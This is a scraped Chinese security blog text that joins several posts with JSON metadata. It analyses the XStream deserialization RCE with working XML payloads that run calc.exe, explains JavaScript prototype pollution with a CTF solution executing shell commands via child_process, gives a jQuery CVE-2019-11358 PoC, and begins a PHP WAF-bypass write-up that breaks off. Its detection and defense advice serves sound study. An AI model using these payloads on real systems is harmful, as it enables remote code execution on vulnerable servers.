在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。 整个调试过程主要的函数调用链如下： 123456789101112131415161718192021XStream.fromXMLXStream.unmarshalAbstractTreeMarshallingStrategy.unmarshalTreeUnmarshaller.startHierarchicalStreams.readClassTypeTreeUnmarshaller.convertAnotherDefaultConverterLookup.lookupConverterForType...TreeSetConverter.unmarshalTreeSetConverter.populateTreeMapDynamicProxyConverter.unmarshal...ReflectionConverter.canConvert...TreeMap.putAllAbstractMap.putAllTreeMap.put$Proxy0.compareToEventHandler.invokeEventHandler.invokeInternalMethodUtil.invoke 无法通杀&lt;=1.3.1版本的原因&lt;=1.3.1以下版本不能成功识别出根标签sorted-set的类，也就是说低版本并不支持sorted-set： 1com.thoughtworks.xstream.mapper.CannotResolveClassException: sorted-set : sorted-set 无法通杀1.4-1.4.5版本的原因先看下TreeSetConverter.unmarshal()中的代码逻辑，当sortedMapField不为null时，treeMap才有可能不为null，treeMap不为null才能进入populateTreeMap()： 在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用： 而在&gt;=1.4.5版本中，sortedMapField默认不为null，因此能成功利用： 无法通杀1.4.7-1.4.9版本的原因在1.4.7版本的Change Log中有这么一句: java.bean.EventHandler no longer handled automatically because of severe security vulnerability. 运行PoC会报以下错误： 12345678910Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: No converter specified for class java.beans.EventHandler---- Debugging information ----class : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxyrequired-type : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxyconverter-type : com.thoughtworks.xstream.converters.extended.DynamicProxyConverterpath : /sorted-set/dynamic-proxy/handlerclass[1] : java.util.TreeSetconverter-type[1] : com.thoughtworks.xstream.converters.collections.TreeSetConverterversion : 1.4.7------------------------------- 在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤，导致不能成功利用： 为何1.4.10能够成功我们知道1.4.7-1.4.9版本中是因为在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤导致不能成功利用。 但是我们在1.4.10中发现ReflectionConverter.canConvert()函数中把对EventHandler类的过滤又去掉了： 123public boolean canConvert(Class type) &#123; return (this.type != null &amp;&amp; this.type == type || this.type == null &amp;&amp; type != null) &amp;&amp; this.canAccess(type);&#125; 在利用的过程中虽然能够成功触发，但是控制台会输出提示未初始化XStream安全框架、会存在漏洞风险： 1Security framework of XStream not initialized, XStream is probably vulnerable. 看看1.4.11如何修补的直接运行，先提醒未初始化安全框架，然后报错显示安全警告、拒绝反序列化目标类： 12345678910111213141516Security framework of XStream not initialized, XStream is probably vulnerable.Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Security alert. Unmarshalling rejected.---- Debugging information ----message : Security alert. Unmarshalling rejected.class : java.beans.EventHandlerrequired-type : java.beans.EventHandlerconverter-type : com.thoughtworks.xstream.XStream$InternalBlackListpath : /tree-map/entry[2]/dynamic-proxy/handlerclass[1] : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxyrequired-type[1] : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxyconverter-type[1] : com.thoughtworks.xstream.converters.extended.DynamicProxyConverterclass[2] : java.util.TreeMaprequired-type[2] : java.util.TreeMapconverter-type[2] : com.thoughtworks.xstream.converters.collections.TreeMapConverterversion : 1.4.11------------------------------- 可以看到，1.4.11以后的版本XStream新增了一个Converter类InternalBlackList，可以看到其实现的canConverter()方法中对EventHandler类、以”javax.crypto.”开头的类、以”$LazyIterator”结尾的类都进行了匹配，而其marshal()和unmarshal()方法都是直接抛出异常的，换句话说就是匹配成功的直接抛出异常即黑名单过滤： 12345678910111213141516private class InternalBlackList implements Converter &#123; private InternalBlackList() &#123; &#125; public boolean canConvert(Class type) &#123; return type == Void.TYPE || type == Void.class || !XStream.this.securityInitialized &amp;&amp; type != null &amp;&amp; (type.getName().equals(\"java.beans.EventHandler\") || type.getName().endsWith(\"$LazyIterator\") || type.getName().startsWith(\"javax.crypto.\")); &#125; public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123; throw new ConversionException(\"Security alert. Marshalling rejected.\"); &#125; public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123; throw new ConversionException(\"Security alert. Unmarshalling rejected.\"); &#125;&#125; 在XStream.setupConverters()函数中注册转换器时，InternalBlackList的优先级为PRIORITY_LOW高于ReflectionConverter的优先级PRIORITY_VERY_LOW，因此会优先判断： 因此，在后面的调试中会发现，当要寻找EventHandler类的转换器时，会返回InternalBlackList转换器： 当调用该InternalBlackList转换器的unmarshal()方法时，直接抛出异常： 基于tree-map的PoC适用范围通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。 复现payload2.xml： 1234567891011121314151617181920&lt;tree-map&gt; &lt;entry&gt; &lt;string&gt;fookey&lt;/string&gt; &lt;string&gt;foovalue&lt;/string&gt; &lt;/entry&gt; &lt;entry&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt; &lt;string&gt;good&lt;/string&gt; &lt;/entry&gt;&lt;/tree-map&gt; 运行触发： 可以看到，该payload涉及到的转换器是TreeMapConverter，至于其整个调用过程以及原理和前面sorted-set的差不多，只是转换器不一样了，这里就不再调试分析了。 为何能通杀1.4-1.4.5版本因为本次payload用的是TreeMapConverter转换器，和前面TreeSetConverter不一样，这里不存在类似sortedMapField是否为null的限制，因为两个转换器的代理逻辑完全不一样，调试一下就清楚了。 无法通杀&lt;=1.3.1版本的原因运行PoC会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用： 1com.thoughtworks.xstream.converters.ConversionException: TreeMap does not contain &lt;comparator&gt; element 在TreeMapConverter.unmarshal()中看到，判断子标签节点是否有comparator，若两个if判断条件都不满足则直接抛出异常，不会进入后面的populateMap()函数，因此也不会成功触发： 无法通杀1.4.7-1.4.9版本的原因和前面基于sorted-set的PoC的原因是一样的。 基于接口的PoC适用范围通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。但是缺点是，我们必须得知道服务端反序列化得到的是啥接口类。 接口特征一般的，基于接口类型的payload，是需要按照接口形式来编写的，即interface标签内容指向接口类。比如官网给的例子，其中Contact是个接口类： 12345678910111213&lt;contact&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;org.company.model.Contact&lt;/interface&gt; &lt;handler class='java.beans.EventHandler'&gt; &lt;target class='java.lang.ProcessBuilder'&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;handler&gt; &lt;/dynamic-proxy&gt;&lt;/contact&gt; 12XStream xstream = new XStream();Contact contact = (Contact)xstream.fromXML(xml); 这种方式是基于服务端解析XML之后会直接调用到XML中interface标签指向的接口类声明的方法，因此这种情形下必然会触发动态代理类对象的恶意方法。 复现下面我们试下这个payload，ipayload.xml，这个更为简单直接，不需要在dynamic-proxy外再加其他的转换器，直接利用的DynamicProxyConverter转换器来识别： 1234567891011&lt;dynamic-proxy&gt; &lt;interface&gt;IPerson&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt;&lt;/dynamic-proxy&gt; 修改Test.java，将Person类改为IPerson接口类，和ipayload.xml中的interface标签内容相对应： 123456789public class Test &#123; public static void main(String[] args) throws FileNotFoundException &#123;// String xml = new Scanner(new File(\"ipayload.xml\")).useDelimiter(\"\\\\Z\").next(); FileInputStream xml = new FileInputStream(\"ipayload.xml\"); XStream xstream = new XStream(new DomDriver()); IPerson p = (IPerson) xstream.fromXML(xml); p.output(); &#125;&#125; 还有一点需要注意的是，IPerson接口类必须定义成public即公有的，否则程序运行会报错显示没有权限访问该接口类。 成功触发： 无法通杀&lt;=1.3.1版本的原因尝试攻击会报以下错误，说是不能创建EventHandler类对象、因为其没有无参构造函数： 123456789Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Cannot construct java.beans.EventHandler as it does not have a no-args constructor : Cannot construct java.beans.EventHandler as it does not have a no-args constructor---- Debugging information ----message : Cannot construct java.beans.EventHandler as it does not have a no-args constructorcause-exception : com.thoughtworks.xstream.converters.reflection.ObjectAccessExceptioncause-message : Cannot construct java.beans.EventHandler as it does not have a no-args constructorclass : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxyrequired-type : java.beans.EventHandlerpath : /dynamic-proxy/handler------------------------------- 无法通杀1.4.7-1.4.9版本的原因和前面基于sorted-set的PoC的原因是一样的。 0x03 检测与防御检测方法 查看目标环境中是否有存在漏洞版本的XStream的jar包，即1.4.x系列版本中&lt;=1.4.6或=1.4.10； 全局搜索是否存在Xstream.fromXML(的地方，若存在则进一步分析该参数是否外部可控；若为1.4.10版本的还需要确认是否开启了安全配置进行了有效的防御； 防御方法 将XStream升级到最新版，即1.4.11之后的版本； 若只想手动修改代码，可以参考1.4.7-1.4.9版本的修补方法，在ReflectionConverter.canConvert()函数中添加了对包括EventHandler等类的过滤，当然这只是黑名单过滤方式，存在绕过风险： 1234public boolean canConvert(Class type) &#123; return ((this.type != null &amp;&amp; this.type == type) || (this.type == null &amp;&amp; type != null &amp;&amp; type != eventHandlerType)) &amp;&amp; canAccess(type);&#125; 若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，可以调用addPermission()、allowTypes()、denyTypes()等对某些类进行限制，即建立黑白名单机制进行过滤： 1234567891011121314XStream.addPermission（TypePermission）;XStream.allowTypes（Class []）;XStream.allowTypes（String []）;XStream.allowTypesByRegExp（String []）;XStream.allowTypesByRegExp（Pattern []）;XStream.allowTypesByWildcard（String []）;XStream.allowTypeHierary（Class）;XStream.denyPermission（TypePermission）;XStream.denyTypes（Class []）;XStream.denyTypes（String []）;XStream.denyTypesByRegExp（String []）;XStream.denyTypesByRegExp（Pattern []）;XStream.denyTypesByWildcard（String []）;XStream.denyTypeHierary（Class）; 具体的参考：http://x-stream.github.io/security.html 若是1.4.10版本，提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认白名单，其本质还是调用XStream提供的安全框架里的addPermission()、allowTypes()、denyTypes()等函数，区别在于自己定义了一些默认白名单，但必须手工设置，否则还是存在漏洞： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586public static void setupDefaultSecurity(final XStream xstream) &#123; if (xstream.insecureWarning) &#123; xstream.addPermission(NoTypePermission.NONE); xstream.addPermission(NullPermission.NULL); xstream.addPermission(PrimitiveTypePermission.PRIMITIVES); xstream.addPermission(ArrayTypePermission.ARRAYS); xstream.addPermission(InterfaceTypePermission.INTERFACES); xstream.allowTypeHierarchy(Calendar.class); xstream.allowTypeHierarchy(Collection.class); xstream.allowTypeHierarchy(Map.class); xstream.allowTypeHierarchy(Map.Entry.class); xstream.allowTypeHierarchy(Member.class); xstream.allowTypeHierarchy(Number.class); xstream.allowTypeHierarchy(Throwable.class); xstream.allowTypeHierarchy(TimeZone.class); Class type = JVM.loadClassForName(\"java.lang.Enum\"); if (type != null) &#123; xstream.allowTypeHierarchy(type); &#125; type = JVM.loadClassForName(\"java.nio.file.Path\"); if (type != null) &#123; xstream.allowTypeHierarchy(type); &#125; final Set types = new HashSet(); types.add(BitSet.class); types.add(Charset.class); types.add(Class.class); types.add(Currency.class); types.add(Date.class); types.add(DecimalFormatSymbols.class); types.add(File.class); types.add(Locale.class); types.add(Object.class); types.add(Pattern.class); types.add(StackTraceElement.class); types.add(String.class); types.add(StringBuffer.class); types.add(JVM.loadClassForName(\"java.lang.StringBuilder\")); types.add(URL.class); types.add(URI.class); types.add(JVM.loadClassForName(\"java.util.UUID\")); if (JVM.isSQLAvailable()) &#123; types.add(JVM.loadClassForName(\"java.sql.Timestamp\")); types.add(JVM.loadClassForName(\"java.sql.Time\")); types.add(JVM.loadClassForName(\"java.sql.Date\")); &#125; if (JVM.is18()) &#123; xstream.allowTypeHierarchy(JVM.loadClassForName(\"java.time.Clock\")); types.add(JVM.loadClassForName(\"java.time.Duration\")); types.add(JVM.loadClassForName(\"java.time.Instant\")); types.add(JVM.loadClassForName(\"java.time.LocalDate\")); types.add(JVM.loadClassForName(\"java.time.LocalDateTime\")); types.add(JVM.loadClassForName(\"java.time.LocalTime\")); types.add(JVM.loadClassForName(\"java.time.MonthDay\")); types.add(JVM.loadClassForName(\"java.time.OffsetDateTime\")); types.add(JVM.loadClassForName(\"java.time.OffsetTime\")); types.add(JVM.loadClassForName(\"java.time.Period\")); types.add(JVM.loadClassForName(\"java.time.Ser\")); types.add(JVM.loadClassForName(\"java.time.Year\")); types.add(JVM.loadClassForName(\"java.time.YearMonth\")); types.add(JVM.loadClassForName(\"java.time.ZonedDateTime\")); xstream.allowTypeHierarchy(JVM.loadClassForName(\"java.time.ZoneId\")); types.add(JVM.loadClassForName(\"java.time.chrono.HijrahDate\")); types.add(JVM.loadClassForName(\"java.time.chrono.JapaneseDate\")); types.add(JVM.loadClassForName(\"java.time.chrono.JapaneseEra\")); types.add(JVM.loadClassForName(\"java.time.chrono.MinguoDate\")); types.add(JVM.loadClassForName(\"java.time.chrono.ThaiBuddhistDate\")); types.add(JVM.loadClassForName(\"java.time.chrono.Ser\")); xstream.allowTypeHierarchy(JVM.loadClassForName(\"java.time.chrono.Chronology\")); types.add(JVM.loadClassForName(\"java.time.temporal.ValueRange\")); types.add(JVM.loadClassForName(\"java.time.temporal.WeekFields\")); &#125; types.remove(null); final Iterator iter = types.iterator(); final Class[] classes = new Class[types.size()]; for (int i = 0; i &lt; classes.length; ++i) &#123; classes[i] = (Class)iter.next(); &#125; xstream.allowTypes(classes); &#125; else &#123; throw new IllegalArgumentException(\"Security framework of XStream instance already initialized\"); &#125;&#125; 试下效果，在前面的Demo我们添加这个默认白名单过滤： 12345678910public class Test &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileInputStream xml = new FileInputStream(\"ipayload.xml\"); XStream xstream = new XStream(new DomDriver()); // 使用默认白名单过滤 XStream.setupDefaultSecurity(xstream); Person p = (Person) xstream.fromXML(xml); p.output(); &#125;&#125; 运行后会报错，显示禁止反序列化动态代理类，成功修补了漏洞： 0x04 参考XStream官网 RCE via XStream object deserialization XStream CVE-2019-10173漏洞分析","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析JavaScript原型链污染攻击","date":"2019-10-20T04:41:21.000Z","path":"2019/10/20/浅析JavaScript原型链污染攻击/","text":"0x01 基本概念JavaScript构造函数与类在JavaScript中，构造函数相当于类，且可以将其实例化。 如果要定义一个类，需要以定义构造函数的方式来定义： 这里Foo函数的内容，就是Foo类的构造函数，而this.num就是Foo类的一个属性。 JavaScript语法特性在介绍JS原型链之前，需要了解下JS中一些访问对象的语法特性。 如图： JavaScript原型对象prototype与__proto__原型对象prototype原型对象prototype是新对象的模板，它将自身的属性共享给新对象。一个对象不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。 所有的JavaScript对象都会从一个原型对象prototype中继承属性和方法。 JavaScript的每一个函数/类都有一个prototype属性，用来指向该构造函数的原型。 下面定义了一个Hacker函数，看到其有prototype属性、指向了该构造函数的原型本身： __proto__属性JavaScript的每一个实例对象都有一个__proto__属性指向该实例对象的原型。 下面新建一个Hacker类的实例对象hacker，看到其有__proto__属性，访问该属性可知是指向hacker这个实例对象的原型的： 观察发现，实例对象由函数生成，实例对象的__proto__属性是指向函数的prototype属性的，即： 接着我们注意到，在前面调用的无论是实例对象的__proto__属性还是构造函数/类的prototype属性，它们均有一个__proto__属性指向Object，而再往下调用__proto__属性就是在调用Object.__proto__、其值为null： 这个就涉及到后面要讲的原型链的东西了：所有JavaScript中的对象都是位于原型链顶端的Object的实例，其中实例对象原型的原型是Object.prototype，而它的原型是null，所以Object.prototype就是原型链的最顶端。 constructor属性我们知道，构造函数/类的prototype属性指向该函数的原型，相应的该构造函数的原型也有相应的属性指向该构造函数——constructor属性。 每个原型对象都有一个constructor属性，指向相关联的构造函数，所以构造函数和构造函数的prototype即原型是可以相互指向的。实例对象也可以访问constructor属性指向其构造函数。 JavaScript原型链与原型链继承原型链由于__proto__是任何JavaScript对象都有的属性，而JavaScript中万物皆对象，因此会形成一条__proto__连起来的链，递归访问__proto__直至到终点即值为null，这就是原型链。 我们看前面用到的Hacker构造函数和hacker实例对象的例子，其原型链即类实例对象的原型链如下： 1hacker -&gt; Hacker.prototype -&gt; Object.prototype -&gt; null 这里改下smi1e的图，可以看到Hacker构造函数和hacker实例对象的原型链结构： 除了类实例对象的原型链，再看看其他的原型链。 数组的原型链： 1c -&gt; Array.prototype -&gt; Object.prototype -&gt; null 日期的原型链： 1d -&gt; Date.prototype -&gt; Object.prototype -&gt; null 函数的原型链： 1f -&gt; function.prototype -&gt; Object.prototype -&gt; null 原型链继承根据原型链，所有类对象在实例化的时候会拥有prototype中的属性和方法，在原型链上的任何位置设置属性都能被子对象访问到，这个特性被用来实现JavaScript中的继承机制。 当JavaScript引擎查找对象的属性时，会先查找对象本身是否存在该属性，若不存在则会在原型对链上查看、直到找到一个名字匹配的属性或到达原型链的末尾即null。这种查找机制被运用在面向对象的继承中，被称为原型链继承。 比如下面定义了构造函数Person，并创建了一个实例对象： 12345678function Person(first, last, age, eyecolor) &#123; this.firstName = first; this.lastName = last; this.age = age; this.eyeColor = eyecolor;&#125; var alan = new Person(\"Alan\", \"Iverson\", 18, \"blue\"); 如果我们想在已定义存在的Person类中直接添加属性是不行的： 1Person.nationality = \"English\"; 要添加的话只能在该构造函数定义的时候添加上该属性： 1234567function Person(first, last, age, eyecolor) &#123; this.firstName = first; this.lastName = last; this.age = age; this.eyeColor = eyecolor; this.nationality = \"English\";&#125; 如果都这样添加的话，实在是太麻烦了。这个时候就能用上原型链继承的方法来轻松实现给示例对象添加新属性的功能： 1Person.prototype.nationality = \"English\"; 总结一下，对于实例对象alan，在调用alan.nationality的时候，实际上JavaScript引擎会进行如下操作： 在实例对象alan中寻找nationality； 如果找不到，则在alan.__proto__中寻找nationality； 如果仍然找不到，则继续在alan.__proto__.__proto__中寻找nationality； 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null； 0x02 JavaScript原型链污染原型链污染在JavaScript中访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。因此我们可以通过a[&quot;__proto__&quot;]的方式去访问其原型对象。 原型链污染一般会出现在对象或数组的键名或属性名可控，而且是赋值语句的情况下。 在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 常见场景那么什么场景会出现原型链污染呢？——一般是可以设置__proto__值的场景，即能够控制数组（对象）的键名的操作： 对象merge，即合并数组对象的操作； 对象clone（其实内核就是将待操作的对象merge到一个空对象中） Demo看个Demo： 1234567891011121314151617// hacker是一个简单的JavaScript对象let hacker = &#123;name: \"mi1k7ea\"&#125;// hacker.name=\"mike\"console.log(hacker.name)// 修改hacker的原型（即Object）hacker.__proto__.name = \"prototype attack!\"// 由于查找顺序的原因，hacker.name仍然是mi1k7eaconsole.log(hacker.name)// 此时再用Object创建一个空的user对象let user = &#123;&#125;// 查看user.name(user.name=\"prototype attack!\")console.log(user.name) 可以看到，hacker实例对象本身就存在name属性，而通过hacker.__proto__.name设置的name属性实际就是设置hacker.__proto__指向的Object对象的name属性并进行了赋值，当再输出hacker实例对象的name属性时，由于JS引擎直接在当前hacker上找到该属性而无需继续往上到原型链上寻找name属性；但user实例对象是个空的对象、无任何属性，因此当尝试输出user对象的name属性值时JS引擎会在user对象的原型链上寻找name属性，其中在Object对象上找到了name属性就获取输出出来： 再看个P神文章中用到的merge()函数的例子，假设有如下的merge()函数定义： 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 其在合并的过程中，存在赋值的操作target[key] = source[key]。因此，当我们控制target的键key为__proto__时就能污染原型链了。 先试下这个payload： 1234567let o1 = &#123;&#125;let o2 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 可以看到并未污染成功： 这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, “proto“: {b: 2}}）中，proto已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，proto并不是一个key，自然也不会修改Object的原型。 因此，我们需要将o2实例对象那部分改为Json格式，如下： 1234567let o1 = &#123;&#125;let o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 可以看到新建的o3实例对象也存在b属性，说明Object已经被污染了，这样就能成功进行原型链污染攻击了： 这是因为，JSON解析的情况下，proto会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。 0x03 Code-Breaking 2018 Thejs这是P神在代码审计中出的一道JS原型链污染题目。 题目环境：https://github.com/phith0n/code-breaking/tree/master/2018/thejs 题目分析访问页面，就是让你选两个项，添加之后就会缓存起来： Add请求报文如下： 12345678910111213POST / HTTP/1.1Host: test.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://test.com/Content-Type: application/x-www-form-urlencodedContent-Length: 37Connection: closeCookie: grafana_session=37dd397e606027a65d2179c6a4d00d80Upgrade-Insecure-Requests: 1language%5B%5D=php&amp;category%5B%5D=web 这题是需要进行代码审计的。 这里主要的代码都在server.js中，我们看其中关键部分： 12345678910111213141516171819202122232425262728// ...const lodash = require('lodash')// ...app.engine('ejs', function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)//...app.all('/', (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == 'POST') &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render('index', &#123; language: data.language, category: data.category &#125;)&#125;) 可以看到，这里存在一个用户输入点lodash.merge(data, req.body)，即在请求方法为POST时直接将req.body的值作为lodash.merge()的第二个参数传入，而我们在前面知道merge()函数是合并数组的操作，同时也是原型链污染的常见场景，因此我们可以通过POST方式传入的请求体内容来污染data数组。 在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。 我们去看下lodash.template()的源码吧： 1234567// Use a sourceURL for easier debugging.var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\\n' : '';// ...var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。 但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。 了解一下，Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数： 而Function.apply(object, args)可以调用该函数，可以理解为object.function(arg1, arg2)，args=[arg1, arg2]： 再看下attempt是干啥的，在attemp.js中有定义： 1234567var attempt = baseRest(function(func, args) &#123; try &#123; return apply(func, undefined, args); &#125; catch (e) &#123; return isError(e) ? e : new Error(e); &#125;&#125;); 说到底attempt就是func.apply()，就是执行定义的函数。 那么options是怎么传进来的？我们回到server.js： 12let compiled = lodash.template(content)let rendered = compiled(&#123;...options&#125;) 这里三个点是将options数组打散为序列的意思。到这我们还是不能确定options是否可控，但这没必要去考虑，因为我们通过原型链污染来污染Object.sourceURL，致使在寻找options.sourceURL时JS引擎还是能成功在options的原型链上找到该属性。 至此，也就是说，当我们通过原型链污染致使options.sourceURL存在值时，程序会将options.sourceURL污染值拼接到Function()的第二个参数中，导致任意代码执行。 题解缺陷payload根据上述分析，可以通过原型链污染致使Object存在污染进来的sourceURL属性，从而导致options也有sourceURL属性进而任意代码执行。 下面这个是有缺陷的payload： 1&#123;\"__proto__\": &#123;\"sourceURL\": \"\\nreturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('ls /')&#125;\\n\"&#125;&#125; 这里e =&gt; { return ...}是ES6的匿名函数创建语法，相当于： 1function(e)&#123; return ...;&#125; 之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计Function(importsKeys, sourceURL + &#39;return &#39; + source)中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function 发送前，注意Content-Type改为application/json： 虽然能执行命令拿到flag，但是Web页面不能再直接访问了。这是因为只要在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务。 优化payload在上一个基础上，在执行本次命令之前用for循环把之前的污染删掉： 1&#123;\"__proto__\": &#123;\"sourceURL\": \"\\nreturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag_thepr0t0js')&#125;\\n\"&#125;&#125; 此时的Web服务能正常访问。 0x04 jQuery原型污染漏洞（CVE-2019-11358）在jQuery &lt; 3.4.0的版本中存在原型污染漏洞。 下面参考奇安信的漏洞分析。 在./src/core.js第155行中，options取传入的参数 arguments[i]： 1if ((options = arguments[ i ]) != null) &#123; 而后在第158 、159 行中，将options遍历赋值给copy，即copy外部可控： 1for (name in options) &#123; copy= options [name]; 接着，在第167-185行中，判断copy是否是数组；若是，则调用jQuery.extend()函数，该函数用于将一个或多个对象的内容合并到目标对象，这里是将外部可控的copy数组扩展到target数组中；若copy非数组而是个对象，则直接将copy变量值赋值给target[name]： 1// Recurse if we're merging plain objects or arraysif ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = Array.isArray( copy ) ) ) ) &#123; ... // Never move original objects, clone them target[ name ] = jQuery.extend( deep, clone, copy ); // Don't bring in undefined values&#125; else if ( copy !== undefined ) &#123; target[ name ] = copy;&#125; 此时，如果name可以被设置为__proto__，则会向上影响target的原型，进而覆盖造成原型污染。 往前面找，在第127行中可以看到，target数组是取传入的参数arguments[0]： 1target = arguments[ 0 ] || &#123;&#125;, 也就是说，target变量可以通过外部传入的参数arguments数组的第一个元素来设置target数组的键name对应的值为__proto__，而options变量可通过外部传入的参数arguments[i]进行赋值，copy变量又是由options遍历赋值的，进而导致copy变量外部可控，最后会将copy合入或赋值到target数组中，因此当target[__proto__]=外部可控的copy时就存在原型污染漏洞了。 简单地说，就是target[name]=copy的赋值语句两边均可控，导致JS原型污染漏洞的存在。 因此可以构造如下PoC来验证，先引入漏洞版本的jQuery，再进行JS原型污染攻击： 1var jquery = document.createElement('script'); jquery.src = 'https://code.jquery.com/jquery-3.3.1.min.js';document.getElementsByTagName('head')[0].appendChild(jquery);let a = $.extend(true, &#123;&#125;, JSON.parse('&#123;\"__proto__\": &#123;\"devMode\":\"Hacked By Mi1k7ea\"&#125;&#125;'))console.log(&#123;&#125;.devMode); 0x05 参考深入理解 JavaScript Prototype 污染攻击 JavaScript 原型链污染 JavaScript原型链污染学习笔记 JavaScript 原型链污染 jQuery CVE-2019-11358 原型污染漏洞分析和修复建议","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.mi1k7ea.com/tags/JavaScript/"}]},{"title":"InCTF 2019 PHP+1,+1.5,+2.5三题复现","date":"2019-10-20T03:01:43.000Z","path":"2019/10/20/InCTF-2019-PHP三题复现/","text":"这里复现下InCTF 2019 PHP+1,+1.5,+2.5这三道PHP的题目，考点是绕过WAF和disable_functions。 0x01 题目分析这三道题都是PHP代码审计题目，三题之间层层递进，区别在于自身写的WAF越来越严格地进行了过滤。 先分别看看三个题目的源码。 PHP+1源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php// PHP+1$input = $_GET['input'];function check()&#123; global $input; foreach (get_defined_functions()['internal'] as $blacklisted) &#123; if (preg_match('/' . $blacklisted . '/im', $input)) &#123; echo \"Your input is blacklisted\" . 